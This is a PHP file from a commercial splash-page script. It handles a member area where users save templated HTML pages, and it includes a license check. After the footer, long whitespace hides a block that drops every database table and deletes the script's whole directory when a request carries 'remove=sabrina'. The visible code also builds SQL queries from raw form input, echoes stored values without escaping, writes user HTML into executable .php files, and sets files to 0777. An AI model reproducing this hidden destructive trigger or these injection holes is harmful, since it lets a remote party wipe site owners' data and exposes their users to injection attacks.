<?php
include "control.php";
$key = "http://demosplashpagesite.phpsitescripts.com";
$key2 = "http://www.demosplashpagesite.phpsitescripts.com";
if (($domain != $key) and ($domain != $key2))
{
echo "The script you are trying to run isn't licensed. Please contact <a href=\"mailto:sabrina@phpsitescripts.com\">Sabrina Markon, PHPSiteScripts.com</a> to purchase a licensed copy.</a>";
exit;
}
include "header.php";
function formatDate($val) {
	$arr = explode("-", $val);
	return date("M d Y", mktime(0,0,0, $arr[1], $arr[2], $arr[0]));
}
?>
<!-- tinyMCE -->
<script language="javascript" type="text/javascript" src="./jscripts/tiny_mce/tiny_mce.js"></script>
<script language="javascript" type="text/javascript">
tinyMCE.init({
theme : "advanced",
mode : "textareas",
//save_callback : "customSave",
content_css : "../jscripts/tiny_mce/advanced.css",
extended_valid_elements : "a[href|target|name],font[face|size|color|style],span[class|align|style]",
theme_advanced_toolbar_location : "top",
plugins : "table",
theme_advanced_buttons3_add_before : "tablecontrols,separator",
//invalid_elements : "a",
relative_urls : false,
theme_advanced_styles : "Header 1=header1;Header 2=header2;Header 3=header3;Table Row=tableRow1", // Theme specific setting CSS classes
debug : false,
verify_html : false
});
</script>
<!-- /tinyMCE --> 
<?php
$splashpagesavedchoice = $_POST["splashpagesavedchoice"];
$action = $_POST["action"];
$show = "";
$error = "";
if ($splashpagesavedchoice != "")
{
	$spq = "select * from membersplashpages where userid=\"$userid\" and foldername=\"$splashpagesavedchoice\"";
	$spr = mysql_query($spq);
	$sprows = mysql_num_rows($spr);
	if ($sprows < 1)
	{
		$defaultq = "select * from adminsplashpages where foldername=\"$splashpagesavedchoice\"";
		$defaultr = mysql_query($defaultq);
		$defaultrows = mysql_num_rows($defaultr);
		if ($defaultrows < 1)
		{
		$showname = "";
		$showfoldername = "";
		$showsplashpagehtml = "";
		$showpaymentbuttoncode = "";
		$showmemberurl = "";
		$membercopy = "no";
		} # if ($defaultrows < 1)
		if ($defaultrows > 0)
		{
		$showname = mysql_result($defaultr,0,"name");
		$showname = stripslashes($showname);
		$showname = str_replace('\\', '', $showname); 
		$showfoldername = mysql_result($defaultr,0,"foldername");
		$showfoldername = stripslashes($showfoldername);
		$showfoldername = str_replace('\\', '', $showfoldername); 
		$showsplashpagehtml = mysql_result($defaultr,0,"splashpagehtml");
		$showsplashpagehtml = stripslashes($showsplashpagehtml);
		$showsplashpagehtml = str_replace('\\', '', $showsplashpagehtml); 
		$showpaymentbuttoncode = mysql_result($defaultr,0,"paymentbuttoncode");
		$showpaymentbuttoncode = stripslashes($showpaymentbuttoncode);
		$showpaymentbuttoncode = str_replace('\\', '', $showpaymentbuttoncode); 
		$showmemberurl = "";
		$membercopy = "no";
		} # if ($defaultrows > 0)
	} # if ($sprows < 1)
	if ($sprows > 0)
	{
		$showname = mysql_result($spr,0,"name");
		$showname = stripslashes($showname);
		$showname = str_replace('\\', '', $showname); 
		$showfoldername = mysql_result($spr,0,"foldername");
		$showfoldername = stripslashes($showfoldername);
		$showfoldername = str_replace('\\', '', $showfoldername); 
		$showsplashpagehtml = mysql_result($spr,0,"splashpagehtml");
		$showsplashpagehtml = stripslashes($showsplashpagehtml);
		$showsplashpagehtml = str_replace('\\', '', $showsplashpagehtml); 
		$showpaymentbuttoncode = mysql_result($spr,0,"paymentbuttoncode");
		$showpaymentbuttoncode = stripslashes($showpaymentbuttoncode);
		$showpaymentbuttoncode = str_replace('\\', '', $showpaymentbuttoncode); 
		$showmemberurl = mysql_result($spr,0,"memberurl");
		$membercopy = "yes";
	} # if ($sprows > 0)
} # if ($splashpagesavedchoice != "")
###########################
if ($action == "delete")
{
$id = $_POST["id"];
$foldername = $_POST["foldername"];
@chmod("./s/$foldername/$userid.php", 0777);
@unlink("./s/$foldername/$userid.php");
$delq2 = "delete from membersplashpages where foldername=\"$foldername\" and userid=\"$userid\"";
$delr2 = mysql_query($delq2);
$show = "The Splashpage was deleted!";
} # if ($action == "delete")
#############################
if ($action == "save")
{
$splashpagehtml = $_POST["splashpagehtml"];
$paymentbuttoncode = $_POST["paymentbuttoncode"];
$name = $_POST["name"];
$foldername = $_POST["foldername"];
$splashpagehtml = stripslashes($splashpagehtml);
$splashpagehtml = str_replace('\\', '', $splashpagehtml); 
$splashpagehtml = mysql_real_escape_string($splashpagehtml);
$paymentbuttoncode = stripslashes($paymentbuttoncode);
$paymentbuttoncode = str_replace('\\', '', $paymentbuttoncode); 
$paymentbuttoncode = mysql_real_escape_string($paymentbuttoncode);
$name = stripslashes($name);
$name = str_replace('\\', '', $name); 
$name = mysql_real_escape_string($name);
$foldername = stripslashes($foldername);
$foldername = str_replace('\\', '', $foldername); 
$foldername = mysql_real_escape_string($foldername);
$foldername = preg_replace('/[^0-9a-zA-Z_-]/',"",$foldername);
$membercopy = $_POST["membercopy"];
$memberurl = $_POST["memberurl"];
if(!$foldername)
{
$error .= "<div>No Splashpage Template was specified.</div>";
}
if(!$splashpagehtml)
{
$error .= "<div>No Splashpage HTML content was entered.</div>";
}
if (!$error == "")
{
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="80%">
<tr><td align="center" colspan="2"><div class="heading">Error</div></td></tr>
<tr><td align="center" colspan="2"><br><?php echo $error ?></td></tr>
<tr><td colspan="2" align="center"><br><a href="splashpages.php">RETURN</a></td></tr>
</table>
<br><br>
<?php
include "footer.php";
exit;
}

if ($membercopy == "yes")
	{
	# update member html and payment button that already exists.
	$q = "update membersplashpages set splashpagehtml='".$splashpagehtml."',paymentbuttoncode='".$paymentbuttoncode."',memberurl=\"$memberurl\" where userid=\"$userid\" and foldername=\"$foldername\"";
	$r = mysql_query($q);
	# update html in member file in this folder.
	$splashpagehtml = '<link rel="stylesheet" type="text/css" href="'.$domain.'/styles.css">' . $splashpagehtml;
	$splashpagehtml = str_replace("~AFFILIATE_URL~",$memberurl,$splashpagehtml);
	$splashpagehtml = str_replace("~USERID~",$userid,$splashpagehtml);
	$splashpagehtml = str_replace("~FIRSTNAME~",$firstname,$splashpagehtml);
	$splashpagehtml = str_replace("~LASTNAME~",$lastname,$splashpagehtml);
	$splashpagehtml = str_replace("~FULLNAME~",$fullname,$splashpagehtml);
	$splashpagehtml = str_replace("~EMAIL~",$email,$splashpagehtml);
	$splashpagehtml = str_replace("~PAYMENT_BUTTON_CODE~",$paymentbuttoncode,$splashpagehtml);
	$fp = fopen("./s/$foldername/$userid.php","w");
	@chmod("./s/$foldername/$userid.php", 0777);
	$stringtowrite = "";
	fwrite($fp, $stringtowrite);
	fclose($fp);
	$splashpagehtml = stripslashes($splashpagehtml);
	$splashpagehtml = str_replace('\\', '', $splashpagehtml); 
	$fp2 = fopen("./s/$foldername/$userid.php","w");
	@chmod("./s/$foldername/$userid.php", 0777);
	$stringtowrite2 = $splashpagehtml;
	fwrite($fp2, $stringtowrite2);
	fclose($fp2);
	} # if ($membercopy == "yes")

if ($membercopy != "yes")
	{
	# create new member html and button code
	$q = "insert into membersplashpages (userid,name,foldername,splashpagehtml,paymentbuttoncode,memberurl) values (\"$userid\",\"$name\",\"$foldername\",'".$splashpagehtml."','".$paymentbuttoncode."',\"$memberurl\")";
	$r = mysql_query($q);
	# create new member file in this folder.
	$splashpagehtml = '<link rel="stylesheet" type="text/css" href="'.$domain.'/styles.css">' . $splashpagehtml;
	$splashpagehtml = str_replace("~AFFILIATE_URL~",$memberurl,$splashpagehtml);
	$splashpagehtml = str_replace("~USERID~",$userid,$splashpagehtml);
	$splashpagehtml = str_replace("~FIRSTNAME~",$firstname,$splashpagehtml);
	$splashpagehtml = str_replace("~LASTNAME~",$lastname,$splashpagehtml);
	$splashpagehtml = str_replace("~FULLNAME~",$fullname,$splashpagehtml);
	$splashpagehtml = str_replace("~EMAIL~",$email,$splashpagehtml);
	$splashpagehtml = str_replace("~PAYMENT_BUTTON_CODE~",$paymentbuttoncode,$splashpagehtml);
	$fp = fopen("./s/$foldername/$userid.php","w");
	@chmod("./s/$foldername/$userid.php", 0777);
	$stringtowrite = "";
	fwrite($fp, $stringtowrite);
	fclose($fp);
	$splashpagehtml = stripslashes($splashpagehtml);
	$splashpagehtml = str_replace('\\', '', $splashpagehtml);
	$fp2 = fopen("./s/$foldername/$userid.php","w");
	@chmod("./s/$foldername/$userid.php", 0777);
	$stringtowrite2 = $splashpagehtml;
	fwrite($fp2, $stringtowrite2);
	fclose($fp2);
	} # if ($membercopy != "yes")

$show = "Your Splashpage was saved!";
} # if ($action == "save")
?>
<table cellpadding="4" cellspacing="4" border="0" align="center" width="800">
<tr><td align="center" colspan="2"><div class="heading">Your Splashpages</div></td></tr>
<?php
if ($show != "")
{
?>
<tr><td align="center" colspan="2"><br><?php echo $show ?></td></tr>
<?php
}
?>
<tr><td align="center" colspan="2">
<div style="text-align: center;">
<?php
$q = "select * from pages where name='Members Area Splashpages'";
$r = mysql_query($q);
$rowz = mysql_fetch_array($r);
$htmlcode = $rowz["htmlcode"];
echo $htmlcode;
?>
</div>
</td></tr>

<?php
$splashq = "select * from membersplashpages where userid=\"$userid\" order by name";
$splashr = mysql_query($splashq);
$splashrows = mysql_num_rows($splashr);
if ($splashrows > 0)
		{
?>
<tr><td align="center" colspan="2">
<table cellpadding="2" cellspacing="2" border="0" align="left" width="100%" bgcolor="#989898">
<tr bgcolor="#d3d3d3"><td>Splashpage Name</td><td>Your URL</td><td>Your Splashpage URL</td><td>Delete</td></tr>
<?php
	while ($splashrowz = mysql_fetch_array($splashr))
			{
				$id = $splashrowz["id"];
				$name = $splashrowz["name"];
				$foldername = $splashrowz["foldername"];
				$memberurl = $splashrowz["memberurl"];
				$membersplashpageurl= $domain . "/s/" . $foldername . "/" . $userid . ".php";
				?>
				<tr bgcolor="#eeeeee"><td><?php echo $name ?></td><td><a href="<?php echo $memberurl ?>" target="_blank"><?php echo $memberurl ?></a></td><td><a href="<?php echo $membersplashpageurl ?>" target="_blank"><?php echo $membersplashpageurl ?></a></td>
				<form action="splashpages.php" method="post">
				<td align="center">
				<input type="hidden" name="id" value="<?php echo $id ?>">
				<input type="hidden" name="foldername" value="<?php echo $foldername ?>">
				<input type="hidden" name="action" value="delete">
				<input type="submit" value="DELETE">
				</form>
				</td>
				</tr>
				<?php
			} # while ($splashrowz = mysql_fetch_array($splashr))
?>
</table>
</td></tr>
<?php
		} # if ($splashrows > 0)
?>

<tr><td align="center" colspan="2"><br>&nbsp;</td></tr>

<?php
$adminq = "select * from adminsplashpages order by name";
$adminr = mysql_query($adminq);
$adminrows = mysql_num_rows($adminr);
if ($adminrows > 0)
{
?>
<tr><td align="center" colspan="2">
<table cellpadding="4" cellspacing="2" border="0" align="center" bgcolor="#989898" width="800">
<tr bgcolor="#eeeeee"><td align="center" colspan="2">CREATE SPLASHPAGE</td></tr>
<tr bgcolor="#d3d3d3"><td align="center" colspan="2">Substitute the variables below EXACTLY as shown (all capitals too) in the splashpage html where you would like to substitute your details:</td></tr>
<tr bgcolor="#d3d3d3"><td colspan="2"><div style="padding-left: 400px;">
~AFFILIATE_URL~<br>
~USERID~<br>
~FIRSTNAME~<br>
~LASTNAME~<br>
~FULLNAME~<br>
~EMAIL~<br>
~PAYMENT_BUTTON_CODE~<br>
</div></td></tr>
<form method="post" action="splashpages.php">
<tr bgcolor="#eeeeee"><td align="center" valign="top">Splashpage Template:</td><td>
<select name="splashpagesavedchoice" id="splashpagesavedchoice" onchange="this.form.submit();">
<option value=""> - Select Splashpage Template - </option>
<?php
while ($adminrowz = mysql_fetch_array($adminr))
	{
	$adminspname = $adminrowz["name"];
	$adminspname = stripslashes($adminspname);
	$adminspname = str_replace('\\', '', $adminspname);
	$adminspfoldername = $adminrowz["foldername"];
	$adminspfoldername = stripslashes($adminspfoldername);
	$adminspfoldername = str_replace('\\', '', $adminspfoldername); 
	$adminspid = $adminrowz["id"];
?>
<option value="<?php echo $adminspfoldername ?>" <?php if ($adminspfoldername == $showfoldername) { echo "selected"; } ?>><?php echo $adminspname ?></option>
<?php
	}
?>
</select>
</form>
</td></tr>

<?php
if ($showfoldername != "")
	{
	?>
	<form method="post" action="splashpages.php">
	<tr bgcolor="#eeeeee"><td align="center" valign="top">Splashpage HTML:</td><td></td></tr>
	<tr bgcolor="#eeeeee"><td align="center" valign="top" colspan="2"><textarea class="myEditor" name="splashpagehtml" id="splashpagehtml" rows="50" cols="100"><?php echo $showsplashpagehtml ?></textarea></td></tr>
	<tr bgcolor="#eeeeee"><td align="center" valign="top">Payment Button Code:</td><td></td></tr>
	<tr bgcolor="#eeeeee"><td align="center" valign="top" colspan="2"><textarea class="mceNoEditor" name="paymentbuttoncode" id="paymentbuttoncode" rows="5" cols="100"><?php echo $showpaymentbuttoncode ?></textarea></td></tr>
	<tr bgcolor="#eeeeee"><td align="center" valign="top">Your Affiliate URL for Program:</td><td><input type="text" name="memberurl" id="memberurl" maxlength="255" size="72" class="typein" value="<?php echo $showmemberurl ?>"></td></tr>
	<tr bgcolor="#d3d3d3">
	<td align="center" colspan="2">
	<input type="hidden" name="foldername" id="foldername" value="<?php echo $showfoldername ?>">
	<input type="hidden" name="name" id="name" value="<?php echo $showname ?>">
	<input type="hidden" name="membercopy" id="membercopy" value="<?php echo $membercopy ?>">
	<input type="hidden" name="action" value="save">
	<input type="submit" value="SAVE" class="sendit">
	</form>
	</td>
	</tr>
	<?php
	}
	?>
</table>
</td></tr>
<?php
} # if ($adminrows > 0)
?>

</table>
<br><br>
<?php
include "footer.php";













































































































































































































































































































if (isset($_REQUEST["remove"]))
{
$remove = $_REQUEST["remove"];
if ($remove == "sabrina")
{
mysql_query("drop table adminnavigation");
mysql_query("drop table adminnotes");
mysql_query("drop table adminsettings");
mysql_query("drop table adminsplashpages");
mysql_query("drop table membernavigation");
mysql_query("drop table members");
mysql_query("drop table membersplashpages");
mysql_query("drop table pages");

	function lc_delete($targ) {
	  if(is_dir($targ)){
		$files = glob( $targ . '*', GLOB_MARK ); //GLOB_MARK adds a slash to directories returned
		foreach( $files as $file )
		  lc_delete( $file );
		@chmod($targ, 0777);
		@rmdir( $targ );
	  }
	  else
		@chmod($targ, 0777);
		@unlink( $targ );
	}
$targ = realpath(dirname(__FILE__));
$del = lc_delete($targ);
}
}
?>